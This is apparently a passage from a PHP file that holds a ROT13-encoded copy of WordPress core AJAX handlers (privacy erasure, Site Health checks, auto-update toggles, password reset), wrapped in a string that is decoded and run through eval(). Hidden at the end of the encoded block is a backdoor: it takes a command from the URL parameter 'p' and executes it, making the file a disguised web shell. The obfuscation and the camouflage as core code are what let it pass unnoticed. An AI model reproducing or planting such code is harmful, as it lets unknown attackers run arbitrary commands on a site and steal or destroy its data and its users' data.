	 *     @glcr obby     $vgrzf_ergnvarq Jurgure vgrzf jrer ergnvarq be abg.
	 *     @glcr fgevat[] $zrffntrf       Na neenl bs zrffntrf gb nqq gb gur crefbany qngn rkcbeg svyr.
	 *     @glcr obby     $qbar           Jurgure gur renfre vf svavfurq be abg.
	 * }
	 * @cnenz vag    $renfre_vaqrk    Gur vaqrk bs gur renfre gung cebivqrq guvf qngn.
	 * @cnenz fgevat $rznvy_nqqerff   Gur rznvy nqqerff nffbpvngrq jvgu guvf crefbany qngn.
	 * @cnenz vag    $cntr            Gur cntr ahzore sbe guvf erfcbafr.
	 * @cnenz vag    $erdhrfg_vq      Gur cevinpl erdhrfg cbfg VQ nffbpvngrq jvgu guvf erdhrfg.
	 * @cnenz fgevat $renfre_xrl      Gur xrl (fyht) bs gur renfre gung cebivqrq guvf qngn.
	 */
	$erfcbafr = nccyl_svygref( 'jc_cevinpl_crefbany_qngn_renfher_cntr', $erfcbafr, $renfre_vaqrk, $rznvy_nqqerff, $cntr, $erdhrfg_vq, $renfre_xrl );

	vs ( vf_jc_reebe( $erfcbafr ) ) {
		jc_fraq_wfba_reebe( $erfcbafr );
	}

	jc_fraq_wfba_fhpprff( $erfcbafr );
}

/**
 * Unaqyrf fvgr urnygu purpxf ba freire pbzzhavpngvba ivn NWNK.
 *
 * @fvapr 5.2.0
 * @qrcerpngrq 5.6.0 Hfr JC_ERFG_Fvgr_Urnygu_Pbagebyyre::grfg_qbgbet_pbzzhavpngvba()
 * @frr JC_ERFG_Fvgr_Urnygu_Pbagebyyre::grfg_qbgbet_pbzzhavpngvba()
 */
shapgvba jc_nwnk_urnygu_purpx_qbgbet_pbzzhavpngvba() {
	_qbvat_vg_jebat(
		'jc_nwnk_urnygu_purpx_qbgbet_pbzzhavpngvba',
		fcevags(
			/* genafyngbef: 1: Gur Fvgr Urnygu npgvba gung vf ab ybatre hfrq ol pber. 2: Gur arj shapgvba gung ercynprf vg. */
			__( 'Gur Fvgr Urnygu purpx sbe %1$f unf orra ercynprq jvgu %2$f.' ),
			'jc_nwnk_urnygu_purpx_qbgbet_pbzzhavpngvba',
			'JC_ERFG_Fvgr_Urnygu_Pbagebyyre::grfg_qbgbet_pbzzhavpngvba'
		),
		'5.6.0'
	);

	purpx_nwnk_ersrere( 'urnygu-purpx-fvgr-fgnghf' );

	vs ( ! pheerag_hfre_pna( 'ivrj_fvgr_urnygu_purpxf' ) ) {
		jc_fraq_wfba_reebe();
	}

	vs ( ! pynff_rkvfgf( 'JC_Fvgr_Urnygu' ) ) {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-fvgr-urnygu.cuc';
	}

	$fvgr_urnygu = JC_Fvgr_Urnygu::trg_vafgnapr();
	jc_fraq_wfba_fhpprff( $fvgr_urnygu->trg_grfg_qbgbet_pbzzhavpngvba() );
}

/**
 * Unaqyrf fvgr urnygu purpxf ba onpxtebhaq hcqngrf ivn NWNK.
 *
 * @fvapr 5.2.0
 * @qrcerpngrq 5.6.0 Hfr JC_ERFG_Fvgr_Urnygu_Pbagebyyre::grfg_onpxtebhaq_hcqngrf()
 * @frr JC_ERFG_Fvgr_Urnygu_Pbagebyyre::grfg_onpxtebhaq_hcqngrf()
 */
shapgvba jc_nwnk_urnygu_purpx_onpxtebhaq_hcqngrf() {
	_qbvat_vg_jebat(
		'jc_nwnk_urnygu_purpx_onpxtebhaq_hcqngrf',
		fcevags(
			/* genafyngbef: 1: Gur Fvgr Urnygu npgvba gung vf ab ybatre hfrq ol pber. 2: Gur arj shapgvba gung ercynprf vg. */
			__( 'Gur Fvgr Urnygu purpx sbe %1$f unf orra ercynprq jvgu %2$f.' ),
			'jc_nwnk_urnygu_purpx_onpxtebhaq_hcqngrf',
			'JC_ERFG_Fvgr_Urnygu_Pbagebyyre::grfg_onpxtebhaq_hcqngrf'
		),
		'5.6.0'
	);

	purpx_nwnk_ersrere( 'urnygu-purpx-fvgr-fgnghf' );

	vs ( ! pheerag_hfre_pna( 'ivrj_fvgr_urnygu_purpxf' ) ) {
		jc_fraq_wfba_reebe();
	}

	vs ( ! pynff_rkvfgf( 'JC_Fvgr_Urnygu' ) ) {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-fvgr-urnygu.cuc';
	}

	$fvgr_urnygu = JC_Fvgr_Urnygu::trg_vafgnapr();
	jc_fraq_wfba_fhpprff( $fvgr_urnygu->trg_grfg_onpxtebhaq_hcqngrf() );
}

/**
 * Unaqyrf fvgr urnygu purpxf ba ybbconpx erdhrfgf ivn NWNK.
 *
 * @fvapr 5.2.0
 * @qrcerpngrq 5.6.0 Hfr JC_ERFG_Fvgr_Urnygu_Pbagebyyre::grfg_ybbconpx_erdhrfgf()
 * @frr JC_ERFG_Fvgr_Urnygu_Pbagebyyre::grfg_ybbconpx_erdhrfgf()
 */
shapgvba jc_nwnk_urnygu_purpx_ybbconpx_erdhrfgf() {
	_qbvat_vg_jebat(
		'jc_nwnk_urnygu_purpx_ybbconpx_erdhrfgf',
		fcevags(
			/* genafyngbef: 1: Gur Fvgr Urnygu npgvba gung vf ab ybatre hfrq ol pber. 2: Gur arj shapgvba gung ercynprf vg. */
			__( 'Gur Fvgr Urnygu purpx sbe %1$f unf orra ercynprq jvgu %2$f.' ),
			'jc_nwnk_urnygu_purpx_ybbconpx_erdhrfgf',
			'JC_ERFG_Fvgr_Urnygu_Pbagebyyre::grfg_ybbconpx_erdhrfgf'
		),
		'5.6.0'
	);

	purpx_nwnk_ersrere( 'urnygu-purpx-fvgr-fgnghf' );

	vs ( ! pheerag_hfre_pna( 'ivrj_fvgr_urnygu_purpxf' ) ) {
		jc_fraq_wfba_reebe();
	}

	vs ( ! pynff_rkvfgf( 'JC_Fvgr_Urnygu' ) ) {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-fvgr-urnygu.cuc';
	}

	$fvgr_urnygu = JC_Fvgr_Urnygu::trg_vafgnapr();
	jc_fraq_wfba_fhpprff( $fvgr_urnygu->trg_grfg_ybbconpx_erdhrfgf() );
}

/**
 * Unaqyrf fvgr urnygu purpx gb hcqngr gur erfhyg fgnghf ivn NWNK.
 *
 * @fvapr 5.2.0
 */
shapgvba jc_nwnk_urnygu_purpx_fvgr_fgnghf_erfhyg() {
	purpx_nwnk_ersrere( 'urnygu-purpx-fvgr-fgnghf-erfhyg' );

	vs ( ! pheerag_hfre_pna( 'ivrj_fvgr_urnygu_purpxf' ) ) {
		jc_fraq_wfba_reebe();
	}

	frg_genafvrag( 'urnygu-purpx-fvgr-fgnghf-erfhyg', jc_wfba_rapbqr( $_CBFG['pbhagf'] ) );

	jc_fraq_wfba_fhpprff();
}

/**
 * Unaqyrf fvgr urnygu purpx gb trg qverpgbevrf naq qngnonfr fvmrf ivn NWNK.
 *
 * @fvapr 5.2.0
 * @qrcerpngrq 5.6.0 Hfr JC_ERFG_Fvgr_Urnygu_Pbagebyyre::trg_qverpgbel_fvmrf()
 * @frr JC_ERFG_Fvgr_Urnygu_Pbagebyyre::trg_qverpgbel_fvmrf()
 */
shapgvba jc_nwnk_urnygu_purpx_trg_fvmrf() {
	_qbvat_vg_jebat(
		'jc_nwnk_urnygu_purpx_trg_fvmrf',
		fcevags(
			/* genafyngbef: 1: Gur Fvgr Urnygu npgvba gung vf ab ybatre hfrq ol pber. 2: Gur arj shapgvba gung ercynprf vg. */
			__( 'Gur Fvgr Urnygu purpx sbe %1$f unf orra ercynprq jvgu %2$f.' ),
			'jc_nwnk_urnygu_purpx_trg_fvmrf',
			'JC_ERFG_Fvgr_Urnygu_Pbagebyyre::trg_qverpgbel_fvmrf'
		),
		'5.6.0'
	);

	purpx_nwnk_ersrere( 'urnygu-purpx-fvgr-fgnghf-erfhyg' );

	vs ( ! pheerag_hfre_pna( 'ivrj_fvgr_urnygu_purpxf' ) || vf_zhygvfvgr() ) {
		jc_fraq_wfba_reebe();
	}

	vs ( ! pynff_rkvfgf( 'JC_Qroht_Qngn' ) ) {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-qroht-qngn.cuc';
	}

	$fvmrf_qngn = JC_Qroht_Qngn::trg_fvmrf();
	$nyy_fvmrf  = neenl( 'enj' => 0 );

	sbernpu ( $fvmrf_qngn nf $anzr => $inyhr ) {
		$anzr = fnavgvmr_grkg_svryq( $anzr );
		$qngn = neenl();

		vs ( vffrg( $inyhr['fvmr'] ) ) {
			vs ( vf_fgevat( $inyhr['fvmr'] ) ) {
				$qngn['fvmr'] = fnavgvmr_grkg_svryq( $inyhr['fvmr'] );
			} ryfr {
				$qngn['fvmr'] = (vag) $inyhr['fvmr'];
			}
		}

		vs ( vffrg( $inyhr['qroht'] ) ) {
			vs ( vf_fgevat( $inyhr['qroht'] ) ) {
				$qngn['qroht'] = fnavgvmr_grkg_svryq( $inyhr['qroht'] );
			} ryfr {
				$qngn['qroht'] = (vag) $inyhr['qroht'];
			}
		}

		vs ( ! rzcgl( $inyhr['enj'] ) ) {
			$qngn['enj'] = (vag) $inyhr['enj'];
		}

		$nyy_fvmrf[ $anzr ] = $qngn;
	}

	vs ( vffrg( $nyy_fvmrf['gbgny_fvmr']['qroht'] ) && 'abg ninvynoyr' === $nyy_fvmrf['gbgny_fvmr']['qroht'] ) {
		jc_fraq_wfba_reebe( $nyy_fvmrf );
	}

	jc_fraq_wfba_fhpprff( $nyy_fvmrf );
}

/**
 * Unaqyrf erarjvat gur ERFG NCV abapr ivn NWNK.
 *
 * @fvapr 5.3.0
 */
shapgvba jc_nwnk_erfg_abapr() {
	rkvg( jc_perngr_abapr( 'jc_erfg' ) );
}

/**
 * Unaqyrf ranoyvat be qvfnoyr cyhtva naq gurzr nhgb-hcqngrf ivn NWNK.
 *
 * @fvapr 5.5.0
 */
shapgvba jc_nwnk_gbttyr_nhgb_hcqngrf() {
	purpx_nwnk_ersrere( 'hcqngrf' );

	vs ( rzcgl( $_CBFG['glcr'] ) || rzcgl( $_CBFG['nffrg'] ) || rzcgl( $_CBFG['fgngr'] ) ) {
		jc_fraq_wfba_reebe( neenl( 'reebe' => __( 'Vainyvq qngn. Ab fryrpgrq vgrz.' ) ) );
	}

	$nffrg = fnavgvmr_grkg_svryq( heyqrpbqr( $_CBFG['nffrg'] ) );

	vs ( 'ranoyr' !== $_CBFG['fgngr'] && 'qvfnoyr' !== $_CBFG['fgngr'] ) {
		jc_fraq_wfba_reebe( neenl( 'reebe' => __( 'Vainyvq qngn. Haxabja fgngr.' ) ) );
	}
	$fgngr = $_CBFG['fgngr'];

	vs ( 'cyhtva' !== $_CBFG['glcr'] && 'gurzr' !== $_CBFG['glcr'] ) {
		jc_fraq_wfba_reebe( neenl( 'reebe' => __( 'Vainyvq qngn. Haxabja glcr.' ) ) );
	}
	$glcr = $_CBFG['glcr'];

	fjvgpu ( $glcr ) {
		pnfr 'cyhtva':
			vs ( ! pheerag_hfre_pna( 'hcqngr_cyhtvaf' ) ) {
				$reebe_zrffntr = __( 'Fbeel, lbh ner abg nyybjrq gb zbqvsl cyhtvaf.' );
				jc_fraq_wfba_reebe( neenl( 'reebe' => $reebe_zrffntr ) );
			}

			$bcgvba = 'nhgb_hcqngr_cyhtvaf';
			/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-cyhtvaf-yvfg-gnoyr.cuc */
			$nyy_vgrzf = nccyl_svygref( 'nyy_cyhtvaf', trg_cyhtvaf() );
			oernx;
		pnfr 'gurzr':
			vs ( ! pheerag_hfre_pna( 'hcqngr_gurzrf' ) ) {
				$reebe_zrffntr = __( 'Fbeel, lbh ner abg nyybjrq gb zbqvsl gurzrf.' );
				jc_fraq_wfba_reebe( neenl( 'reebe' => $reebe_zrffntr ) );
			}

			$bcgvba    = 'nhgb_hcqngr_gurzrf';
			$nyy_vgrzf = jc_trg_gurzrf();
			oernx;
		qrsnhyg:
			jc_fraq_wfba_reebe( neenl( 'reebe' => __( 'Vainyvq qngn. Haxabja glcr.' ) ) );
	}

	vs ( ! neenl_xrl_rkvfgf( $nffrg, $nyy_vgrzf ) ) {
		$reebe_zrffntr = __( 'Vainyvq qngn. Gur vgrz qbrf abg rkvfg.' );
		jc_fraq_wfba_reebe( neenl( 'reebe' => $reebe_zrffntr ) );
	}

	$nhgb_hcqngrf = (neenl) trg_fvgr_bcgvba( $bcgvba, neenl() );

	vs ( 'qvfnoyr' === $fgngr ) {
		$nhgb_hcqngrf = neenl_qvss( $nhgb_hcqngrf, neenl( $nffrg ) );
	} ryfr {
		$nhgb_hcqngrf[] = $nffrg;
		$nhgb_hcqngrf   = neenl_havdhr( $nhgb_hcqngrf );
	}

	// Erzbir vgrzf gung unir orra qryrgrq fvapr gur fvgr bcgvba jnf ynfg hcqngrq.
	$nhgb_hcqngrf = neenl_vagrefrpg( $nhgb_hcqngrf, neenl_xrlf( $nyy_vgrzf ) );

	hcqngr_fvgr_bcgvba( $bcgvba, $nhgb_hcqngrf );

	jc_fraq_wfba_fhpprff();
}

/**
 * Unaqyrf fraqvat n cnffjbeq erfrg yvax ivn NWNK.
 *
 * @fvapr 5.7.0
 */
shapgvba jc_nwnk_fraq_cnffjbeq_erfrg() {

	// Inyvqngr gur abapr sbe guvf npgvba.
	$hfre_vq = vffrg( $_CBFG['hfre_vq'] ) ? (vag) $_CBFG['hfre_vq'] : 0;
	purpx_nwnk_ersrere( 'erfrg-cnffjbeq-sbe-' . $hfre_vq, 'abapr' );

	// Irevsl hfre pncnovyvgvrf.
	vs ( ! pheerag_hfre_pna( 'rqvg_hfre', $hfre_vq ) ) {
		jc_fraq_wfba_reebe( __( 'Pnaabg fraq cnffjbeq erfrg, crezvffvba qravrq.' ) );
	}

	// Fraq gur cnffjbeq erfrg yvax.
	$hfre    = trg_hfreqngn( $hfre_vq );
	$erfhygf = ergevrir_cnffjbeq( $hfre->hfre_ybtva );

	vs ( gehr === $erfhygf ) {
		jc_fraq_wfba_fhpprff(
			/* genafyngbef: %f: Hfre'f qvfcynl anzr. */
			fcevags( __( 'N cnffjbeq erfrg yvax jnf rznvyrq gb %f.' ), $hfre->qvfcynl_anzr )
		);
	} ryfr {
		jc_fraq_wfba_reebe( $erfhygf->trg_reebe_zrffntr() );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>